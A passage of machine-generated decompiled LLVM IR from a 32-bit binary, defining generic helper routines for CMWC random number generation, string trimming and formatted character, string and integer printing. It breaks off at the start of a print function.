  %v1_8048199 = add i32 %arg1, -1640531527
  store i32 %v1_8048199, i32* @global_var_805b564.8, align 4
  %v1_80481a6 = add i32 %arg1, 1013904242
  store i32 %v1_80481a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80481a6, i32* @global_var_805b568.9, align 8
  br label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %entry, %dec_label_pc_80481b9
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481e9, %dec_label_pc_80481b9 ]
  %v1_80481bf = add nsw i32 %storemerge5, -3
  store i32 %v1_80481bf, i32* %eax.global-to-local, align 4
  %v1_80481c2 = mul nuw nsw i32 %v1_80481bf, 4
  %v2_80481c2 = add i32 %v1_80481c2, ptrtoint (i32* @global_var_805b560.7 to i32)
  %v3_80481c2 = inttoptr i32 %v2_80481c2 to i32*
  %v4_80481c2 = load i32, i32* %v3_80481c2, align 4
  %v1_80481cc = add nsw i32 %storemerge5, -2
  store i32 %v1_80481cc, i32* %eax.global-to-local, align 4
  %v1_80481cf = mul nuw nsw i32 %v1_80481cc, 4
  %v2_80481cf = add i32 %v1_80481cf, ptrtoint (i32* @global_var_805b560.7 to i32)
  %v3_80481cf = inttoptr i32 %v2_80481cf to i32*
  %v4_80481cf = load i32, i32* %v3_80481cf, align 4
  %v2_80481d6 = xor i32 %v4_80481cf, %v4_80481c2
  %v2_80481db = xor i32 %storemerge5, -1640531527
  %v1_80481dd = xor i32 %v2_80481db, %v2_80481d6
  store i32 %v1_80481dd, i32* %eax.global-to-local, align 4
  %v2_80481e2 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e2 = add i32 %v2_80481e2, ptrtoint (i32* @global_var_805b560.7 to i32)
  %v4_80481e2 = inttoptr i32 %v3_80481e2 to i32*
  store i32 %v1_80481dd, i32* %v4_80481e2, align 4
  %v4_80481e9 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481e9, 4096
  br i1 %exitcond, label %dec_label_pc_80481f5, label %dec_label_pc_80481b9

dec_label_pc_80481f5:                             ; preds = %dec_label_pc_80481b9
  %v0_80481f6 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481f6

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481b9, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048213 = load i32, i32* @global_var_805b290.10, align 16
  %v1_8048218 = add i32 %v0_8048213, 1
  %v1_8048219 = urem i32 %v1_8048218, 4096
  store i32 %v1_8048219, i32* @global_var_805b290.10, align 16
  %v1_8048228 = mul nuw nsw i32 %v1_8048219, 4
  %v2_8048228 = add i32 %v1_8048228, ptrtoint (i32* @global_var_805b560.7 to i32)
  %v3_8048228 = inttoptr i32 %v2_8048228 to i32*
  %v4_8048228 = load i32, i32* %v3_8048228, align 4
  %v7_8048245 = udiv i32 %v4_8048228, 228675
  store i32 %v7_8048245, i32* @global_var_805b28c.11, align 4
  br i1 true, label %dec_label_pc_8048295, label %dec_label_pc_8048287

dec_label_pc_8048287:                             ; preds = %entry
  br label %dec_label_pc_8048295

dec_label_pc_8048295:                             ; preds = %entry, %dec_label_pc_8048287
  store i32 %v1_8048219, i32* @ecx, align 4
  %v1_80482aa = mul nuw nsw i32 %v1_8048219, 4
  %v2_80482aa = add i32 %v1_80482aa, ptrtoint (i32* @global_var_805b560.7 to i32)
  %v3_80482aa = inttoptr i32 %v2_80482aa to i32*
  %v4_80482aa = load i32, i32* %v3_80482aa, align 4
  ret i32 %v4_80482aa

; uselistorder directives
  uselistorder i32 %v1_8048219, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8048295, { 1, 0 }
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp10 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80482ba = load i32, i32* @edi, align 4
  store i32 %v0_80482ba, i32* %stack_var_-8, align 4
  %v4_80482c5 = ptrtoint i8* %tmp10 to i32
  store i1 false, i1* @df, align 1
  %v3_80482d6 = call i32 @_strlen(i8* %tmp10)
  %v1_80482dd = add i32 %v3_80482d6, -1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e3:                             ; preds = %dec_label_pc_80482e6
  %v4_80482e3 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e6:                             ; preds = %entry, %dec_label_pc_80482e3
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e3, %dec_label_pc_80482e3 ]
  %v6_80482e9 = add i32 %stack_var_-16.0, %v4_80482c5
  %v1_80482ec = inttoptr i32 %v6_80482e9 to i8*
  %v2_80482ec = load i8, i8* %v1_80482ec, align 1
  %v2_80482ee = sext i8 %v2_80482ec to i32
  %v1_80482f5 = call i32 @isspace(i32 %v2_80482ee)
  %v1_80482fd = icmp eq i32 %v1_80482f5, 0
  %v1_80482ff = icmp eq i1 %v1_80482fd, false
  br i1 %v1_80482ff, label %dec_label_pc_80482e3, label %dec_label_pc_8048306.preheader

dec_label_pc_8048306.preheader:                   ; preds = %dec_label_pc_80482e6
  %v5_804830c24 = icmp slt i32 %v1_80482dd, %stack_var_-16.0
  br i1 %v5_804830c24, label %dec_label_pc_8048329, label %dec_label_pc_804830e.lr.ph

dec_label_pc_804830e.lr.ph:                       ; preds = %dec_label_pc_8048306.preheader
  br label %dec_label_pc_804830e

dec_label_pc_8048303:                             ; preds = %dec_label_pc_804830e
  %v5_8048303 = add i32 %stack_var_-12.0.in25, -1
  %v5_804830c = icmp slt i32 %v5_8048303, %stack_var_-16.0
  br i1 %v5_804830c, label %dec_label_pc_8048329, label %dec_label_pc_804830e

dec_label_pc_804830e:                             ; preds = %dec_label_pc_804830e.lr.ph, %dec_label_pc_8048303
  %stack_var_-12.0.in25 = phi i32 [ %v1_80482dd, %dec_label_pc_804830e.lr.ph ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v6_8048311 = add i32 %stack_var_-12.0.in25, %v4_80482c5
  %v1_8048314 = inttoptr i32 %v6_8048311 to i8*
  %v2_8048314 = load i8, i8* %v1_8048314, align 1
  %v2_8048316 = sext i8 %v2_8048314 to i32
  %v1_804831d = call i32 @isspace(i32 %v2_8048316)
  %v1_8048325 = icmp eq i32 %v1_804831d, 0
  %v1_8048327 = icmp eq i1 %v1_8048325, false
  br i1 %v1_8048327, label %dec_label_pc_8048303, label %dec_label_pc_8048329

dec_label_pc_8048329:                             ; preds = %dec_label_pc_8048303, %dec_label_pc_804830e, %dec_label_pc_8048306.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_80482dd, %dec_label_pc_8048306.preheader ], [ %stack_var_-12.0.in25, %dec_label_pc_804830e ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v7_804835118 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  br i1 %v7_804835118, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048331:                             ; preds = %dec_label_pc_8048329, %dec_label_pc_8048331
  %v6_804835b20 = phi i32 [ %v6_804835b, %dec_label_pc_8048331 ], [ %v4_80482c5, %dec_label_pc_8048329 ]
  %storemerge.in19 = phi i32 [ %v5_8048348, %dec_label_pc_8048331 ], [ %stack_var_-16.0, %dec_label_pc_8048329 ]
  %v6_8048341 = add i32 %storemerge.in19, %v4_80482c5
  %v1_8048344 = inttoptr i32 %v6_8048341 to i8*
  %v2_8048344 = load i8, i8* %v1_8048344, align 1
  %v3_8048346 = inttoptr i32 %v6_804835b20 to i8*
  store i8 %v2_8048344, i8* %v3_8048346, align 1
  %v5_8048348 = add i32 %storemerge.in19, 1
  %v7_8048351 = icmp sgt i32 %v5_8048348, %stack_var_-12.0.in.lcssa
  %v2_8048359 = sub i32 %v5_8048348, %stack_var_-16.0
  %v6_804835b = add i32 %v2_8048359, %v4_80482c5
  br i1 %v7_8048351, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048353:                             ; preds = %dec_label_pc_8048331, %dec_label_pc_8048329
  %v6_804835b.lcssa = phi i32 [ %v4_80482c5, %dec_label_pc_8048329 ], [ %v6_804835b, %dec_label_pc_8048331 ]
  %v22_804835b = inttoptr i32 %v6_804835b.lcssa to i8*
  store i8 0, i8* %v22_804835b, align 1
  %v3_8048361 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048361, i32* @edi, align 4
  ret i32 %v6_804835b.lcssa

; uselistorder directives
  uselistorder i32 %v6_804835b.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048348, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.in25, { 0, 2, 1 }
  uselistorder i32 %v5_8048303, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v1_80482dd, { 2, 1, 0 }
  uselistorder i32 %v4_80482c5, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp10, { 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8048331, { 1, 0 }
  uselistorder label %dec_label_pc_8048329, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830e, { 1, 0 }
  uselistorder label %dec_label_pc_80482e6, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_804839e

dec_label_pc_804838b:                             ; preds = %entry
  %v3_8048396 = bitcast i8* %stack_var_8 to i32*
  %v4_8048396 = call i32 @__libc_write(i32 1, i32* %v3_8048396, i32 1)
  br label %dec_label_pc_804839e

dec_label_pc_804839e:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_804839f = phi i32 [ %tmp3, %dec_label_pc_8048372 ], [ %v4_8048396, %dec_label_pc_804838b ]
  ret i32 %v0_804839f

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804839e, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp25 = icmp slt i32 %arg3, 1
  br i1 %tmp25, label %dec_label_pc_8048400, label %dec_label_pc_80483ba

dec_label_pc_80483ba:                             ; preds = %entry
  %v4_80483c1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c1, i32* @edx, align 4
  %v2_80483d256 = load i8, i8* %arg2, align 1
  %v3_80483d257 = zext i8 %v2_80483d256 to i32
  %v5_80483d258 = and i32 %v4_80483c1, -256
  %v6_80483d259 = or i32 %v3_80483d257, %v5_80483d258
  %v4_80483d460 = icmp eq i8 %v2_80483d256, 0
  %v1_80483d661 = icmp eq i1 %v4_80483d460, false
  br i1 %v1_80483d661, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483c9:                             ; preds = %dec_label_pc_80483ba, %dec_label_pc_80483c9
  %v6_80483d264 = phi i32 [ %v6_80483d2, %dec_label_pc_80483c9 ], [ %v6_80483d259, %dec_label_pc_80483ba ]
  %v4_80483cf63 = phi i32 [ %v5_80483cc, %dec_label_pc_80483c9 ], [ %v4_80483c1, %dec_label_pc_80483ba ]
  %stack_var_-12.062 = phi i32 [ %v4_80483c9, %dec_label_pc_80483c9 ], [ 0, %dec_label_pc_80483ba ]
  %v4_80483c9 = add i32 %stack_var_-12.062, 1
  %v5_80483cc = add i32 %v4_80483cf63, 1
  %v22_80483cc = inttoptr i32 %v5_80483cc to i8*
  store i32 %v5_80483cc, i32* @edx, align 4
  %v2_80483d2 = load i8, i8* %v22_80483cc, align 1
  %v3_80483d2 = zext i8 %v2_80483d2 to i32
  %v5_80483d2 = and i32 %v6_80483d264, -256
  %v6_80483d2 = or i32 %v3_80483d2, %v5_80483d2
  %v4_80483d4 = icmp eq i8 %v2_80483d2, 0
  %v1_80483d6 = icmp eq i1 %v4_80483d4, false
  br i1 %v1_80483d6, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483d8:                             ; preds = %dec_label_pc_80483c9, %dec_label_pc_80483ba
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483ba ], [ %v4_80483c9, %dec_label_pc_80483c9 ]
  %v5_80483de = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483de, label %dec_label_pc_80483e9, label %dec_label_pc_80483ef

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_80483d8
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483ec = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483ef

dec_label_pc_80483ef:                             ; preds = %dec_label_pc_80483d8, %dec_label_pc_80483e9
  %storemerge = phi i32 [ %v5_80483ec, %dec_label_pc_80483e9 ], [ 0, %dec_label_pc_80483d8 ]
  %v1_80483f2 = and i32 %arg4, 2
  %tmp26 = mul nuw nsw i32 %v1_80483f2, 8
  %tmp27 = or i32 %tmp26, 32
  br label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %dec_label_pc_80483ef, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483ef ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp27, %dec_label_pc_80483ef ]
  %v1_8048403 = urem i32 %arg4, 2
  %v2_8048403 = icmp eq i32 %v1_8048403, 0
  %v1_8048408 = icmp eq i1 %v2_8048403, false
  %.pre11 = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048408, label %dec_label_pc_804844a.preheader, label %dec_label_pc_8048423.preheader

dec_label_pc_8048423.preheader:                   ; preds = %dec_label_pc_8048400
  %tmp2849 = icmp slt i32 %stack_var_12.0, 1
  %tmp2950 = icmp eq i1 %tmp2849, false
  br i1 %tmp2950, label %dec_label_pc_804840c.lr.ph, label %dec_label_pc_804844a.preheader

dec_label_pc_804840c.lr.ph:                       ; preds = %dec_label_pc_8048423.preheader
  br label %dec_label_pc_804840c

dec_label_pc_804840c:                             ; preds = %dec_label_pc_804840c.lr.ph, %dec_label_pc_804840c
  %stack_var_-20.052 = phi i32 [ 0, %dec_label_pc_804840c.lr.ph ], [ %v4_804841d, %dec_label_pc_804840c ]
  %stack_var_12.151 = phi i32 [ %stack_var_12.0, %dec_label_pc_804840c.lr.ph ], [ %v4_8048420, %dec_label_pc_804840c ]
  %v3_8048415 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_804841d = add i32 %stack_var_-20.052, 1
  %v4_8048420 = add i32 %stack_var_12.151, -1
  %tmp28 = icmp slt i32 %v4_8048420, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_804840c, label %dec_label_pc_804844a.preheader

dec_label_pc_804844a.preheader:                   ; preds = %dec_label_pc_8048423.preheader, %dec_label_pc_804840c, %dec_label_pc_8048400
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048400 ], [ %stack_var_12.0, %dec_label_pc_8048423.preheader ], [ %v4_8048420, %dec_label_pc_804840c ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048400 ], [ 0, %dec_label_pc_8048423.preheader ], [ %v4_804841d, %dec_label_pc_804840c ]
  %v2_804844d38 = load i8, i8* %arg2, align 1
  %v4_804844f42 = icmp eq i8 %v2_804844d38, 0
  %v1_804845143 = icmp eq i1 %v4_804844f42, false
  br i1 %v1_804845143, label %dec_label_pc_804842b.lr.ph, label %dec_label_pc_804846c.preheader

dec_label_pc_804842b.lr.ph:                       ; preds = %dec_label_pc_804844a.preheader
  %v4_804844a37 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804842b

dec_label_pc_804842b:                             ; preds = %dec_label_pc_804842b.lr.ph, %dec_label_pc_804842b
  %v4_804844a46 = phi i32 [ %v4_804844a37, %dec_label_pc_804842b.lr.ph ], [ %v5_8048447, %dec_label_pc_804842b ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804842b.lr.ph ], [ %v4_8048444, %dec_label_pc_804842b ]
  %stack_var_8.044 = phi i8* [ %arg2, %dec_label_pc_804842b.lr.ph ], [ %v22_8048447, %dec_label_pc_804842b ]
  %v2_804842e = load i8, i8* %stack_var_8.044, align 1
  %v3_804842e = zext i8 %v2_804842e to i32
  %v3_804843c = call i32 @printchar(i32* %.pre11, i32 %v3_804842e)
  %v4_8048444 = add i32 %stack_var_-20.145, 1
  %v5_8048447 = add i32 %v4_804844a46, 1
  %v22_8048447 = inttoptr i32 %v5_8048447 to i8*
  %v2_804844d = load i8, i8* %v22_8048447, align 1
  %v4_804844f = icmp eq i8 %v2_804844d, 0
  %v1_8048451 = icmp eq i1 %v4_804844f, false
  br i1 %v1_8048451, label %dec_label_pc_804842b, label %dec_label_pc_804846c.preheader

dec_label_pc_804846c.preheader:                   ; preds = %dec_label_pc_804842b, %dec_label_pc_804844a.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804844a.preheader ], [ %v4_8048444, %dec_label_pc_804842b ]
  %tmp3033 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3134 = icmp eq i1 %tmp3033, false
  br i1 %tmp3134, label %dec_label_pc_8048455.lr.ph, label %dec_label_pc_8048472

dec_label_pc_8048455.lr.ph:                       ; preds = %dec_label_pc_804846c.preheader
  br label %dec_label_pc_8048455

dec_label_pc_8048455:                             ; preds = %dec_label_pc_8048455.lr.ph, %dec_label_pc_8048455
  %stack_var_-20.236 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048455.lr.ph ], [ %v4_8048466, %dec_label_pc_8048455 ]
  %stack_var_12.335 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_8048455.lr.ph ], [ %v4_8048469, %dec_label_pc_8048455 ]
  %v3_804845e = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_8048466 = add i32 %stack_var_-20.236, 1
  %v4_8048469 = add i32 %stack_var_12.335, -1
  %tmp30 = icmp slt i32 %v4_8048469, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_8048455, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %dec_label_pc_8048455, %dec_label_pc_804846c.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804846c.preheader ], [ %v4_8048466, %dec_label_pc_8048455 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048447, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483cc, { 1, 2, 0 }
  uselistorder i32 %v4_80483c1, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_8048455, { 1, 0 }
  uselistorder label %dec_label_pc_804842b, { 1, 0 }
  uselistorder label %dec_label_pc_804844a.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804840c, { 1, 0 }
  uselistorder label %dec_label_pc_80483ef, { 1, 0 }
  uselistorder label %dec_label_pc_80483c9, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804848e = sext i32 %tmp35 to i64
  %v4_8048491 = icmp eq i32 %tmp35, 0
  %v5_8048491 = icmp slt i32 %tmp35, 0
  %v1_8048495 = icmp eq i1 %v4_8048491, false
  br i1 %v1_8048495, label %dec_label_pc_80484bc, label %dec_label_pc_8048497

dec_label_pc_8048497:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484ac = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_8048597

dec_label_pc_80484bc:                             ; preds = %entry
  %v4_80484bc = icmp eq i32 %tmp28, 0
  br i1 %v4_80484bc, label %dec_label_pc_80484dd, label %dec_label_pc_80484c2

dec_label_pc_80484c2:                             ; preds = %dec_label_pc_80484bc
  %v12_80484c2 = icmp eq i32 %tmp27, 10
  %v1_80484c6 = icmp eq i1 %v12_80484c2, false
  br i1 %v1_80484c6, label %dec_label_pc_80484dd, label %dec_label_pc_80484c8

dec_label_pc_80484c8:                             ; preds = %dec_label_pc_80484c2
  %v1_80484cc = icmp eq i1 %v5_8048491, false
  br i1 %v1_80484cc, label %dec_label_pc_80484dd, label %dec_label_pc_80484ce

dec_label_pc_80484ce:                             ; preds = %dec_label_pc_80484c8
  %v1_80484d8 = sub i32 0, %tmp35
  %v5_80484da = sext i32 %v1_80484d8 to i64
  br label %dec_label_pc_80484dd

dec_label_pc_80484dd:                             ; preds = %dec_label_pc_80484c8, %dec_label_pc_80484c2, %dec_label_pc_80484bc, %dec_label_pc_80484ce
  %stack_var_-24.0 = phi i64 [ %v5_804848e, %dec_label_pc_80484bc ], [ %v5_804848e, %dec_label_pc_80484c2 ], [ %v5_804848e, %dec_label_pc_80484c8 ], [ %v5_80484da, %dec_label_pc_80484ce ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484bc ], [ 0, %dec_label_pc_80484c2 ], [ 0, %dec_label_pc_80484c8 ], [ 1, %dec_label_pc_80484ce ]
  %v15_80484e0 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_804853e7 = trunc i64 %stack_var_-24.0 to i32
  %v5_804853e8 = icmp eq i32 %v4_804853e7, 0
  %v1_804854215 = icmp eq i1 %v5_804853e8, false
  br i1 %v1_804854215, label %dec_label_pc_80484ee.lr.ph, label %dec_label_pc_8048544

dec_label_pc_80484ee.lr.ph:                       ; preds = %dec_label_pc_80484dd
  %v5_80484f1 = sext i32 %tmp27 to i64
  br label %dec_label_pc_80484ee

dec_label_pc_80484ee:                             ; preds = %dec_label_pc_80484ee.lr.ph, %dec_label_pc_8048516
  %v3_804851618 = phi i8* [ %tmp48, %dec_label_pc_80484ee.lr.ph ], [ %v22_8048516, %dec_label_pc_8048516 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_80484ee.lr.ph ], [ %v5_804853b, %dec_label_pc_8048516 ]
  %v6_80484fc = and i64 %stack_var_-24.116, 4294967295
  %v12_80484fc = udiv i64 %v6_80484fc, %v5_80484f1
  %v13_80484fc = trunc i64 %v12_80484fc to i32
  %v14_80484fc = urem i64 %v6_80484fc, %v5_80484f1
  %v5_8048501 = trunc i64 %v14_80484fc to i8
  %v7_8048508 = icmp sgt i8 %v5_8048501, 9
  br i1 %v7_8048508, label %dec_label_pc_804850a, label %dec_label_pc_8048516

dec_label_pc_804850a:                             ; preds = %dec_label_pc_80484ee
  %tmp52 = trunc i64 %v14_80484fc to i32
  %v5_804850d = add i32 %tmp52, %tmp
  %v1_8048510 = add i32 %v5_804850d, 198
  %v11_8048510 = trunc i32 %v1_8048510 to i8
  br label %dec_label_pc_8048516

dec_label_pc_8048516:                             ; preds = %dec_label_pc_80484ee, %dec_label_pc_804850a
  %stack_var_-36.0 = phi i8 [ %v11_8048510, %dec_label_pc_804850a ], [ %v5_8048501, %dec_label_pc_80484ee ]
  %v4_8048516 = ptrtoint i8* %v3_804851618 to i32
  %v5_8048516 = add i32 %v4_8048516, -1
  %v22_8048516 = inttoptr i32 %v5_8048516 to i8*
  %v1_804851c = add i8 %stack_var_-36.0, 48
  store i8 %v1_804851c, i8* %v22_8048516, align 1
  %v5_804853b = sext i32 %v13_80484fc to i64
  %v5_804853e = icmp eq i32 %v13_80484fc, 0
  %v1_8048542 = icmp eq i1 %v5_804853e, false
  br i1 %v1_8048542, label %dec_label_pc_80484ee, label %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge

dec_label_pc_804853e.dec_label_pc_8048544_crit_edge: ; preds = %dec_label_pc_8048516
  store i8* %v22_8048516, i8** %stack_var_-40, align 4
  br label %dec_label_pc_8048544

dec_label_pc_8048544:                             ; preds = %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge, %dec_label_pc_80484dd
  %v3_8048581622 = phi i32 [ %v5_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %v15_80484e0, %dec_label_pc_80484dd ]
  %v3_8048572 = phi i8* [ %v22_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %tmp48, %dec_label_pc_80484dd ]
  %v4_8048544 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_8048544, label %dec_label_pc_804857b, label %dec_label_pc_804854a

dec_label_pc_804854a:                             ; preds = %dec_label_pc_8048544
  %v4_804854a = icmp eq i32 %tmp31, 0
  br i1 %v4_804854a, label %dec_label_pc_8048572, label %dec_label_pc_8048550

dec_label_pc_8048550:                             ; preds = %dec_label_pc_804854a
  %v1_8048553 = and i32 %tmp32, 2
  %v2_8048553 = icmp eq i32 %v1_8048553, 0
  br i1 %v2_8048553, label %dec_label_pc_8048572, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_8048550
  %v3_8048562 = inttoptr i32 %arg1 to i32*
  %v4_8048562 = call i32 @printchar(i32* %v3_8048562, i32 45)
  %v4_804856d = add i32 %tmp31, -1
  br label %dec_label_pc_804857b

dec_label_pc_8048572:                             ; preds = %dec_label_pc_8048550, %dec_label_pc_804854a
  %v4_8048572 = ptrtoint i8* %v3_8048572 to i32
  %v5_8048572 = add i32 %v4_8048572, -1
  %v22_8048572 = inttoptr i32 %v5_8048572 to i8*
  store i8* %v22_8048572, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_8048572, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80485816.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804857b

dec_label_pc_804857b:                             ; preds = %dec_label_pc_8048544, %dec_label_pc_804855a, %dec_label_pc_8048572
  %v3_80485816 = phi i32 [ %v3_8048581622, %dec_label_pc_8048544 ], [ %v3_80485816.pre, %dec_label_pc_8048572 ], [ %v3_8048581622, %dec_label_pc_804855a ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_8048544 ], [ %tmp31, %dec_label_pc_8048572 ], [ %v4_804856d, %dec_label_pc_804855a ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048544 ], [ 0, %dec_label_pc_8048572 ], [ 1, %dec_label_pc_804855a ]
  %v1_8048587.cast = inttoptr i32 %v3_80485816 to i8*
  %v6_8048587 = call i32 @prints(i32 %arg1, i8* %v1_8048587.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_8048592 = add i32 %v6_8048587, %stack_var_-28.0
  store i32 %v2_8048592, i32* @edx, align 4
  br label %dec_label_pc_8048597

dec_label_pc_8048597:                             ; preds = %dec_label_pc_8048497, %dec_label_pc_804857b
  %storemerge = phi i32 [ %v2_8048592, %dec_label_pc_804857b ], [ %v6_80484ac, %dec_label_pc_8048497 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_8048516, { 0, 1, 3, 2 }
  uselistorder i8 %v5_8048501, { 1, 0 }
  uselistorder i64 %v6_80484fc, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048597, { 1, 0 }
  uselistorder label %dec_label_pc_804857b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048516, { 1, 0 }
  uselistorder label %dec_label_pc_80484ee, { 1, 0 }
  uselistorder label %dec_label_pc_80484dd, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
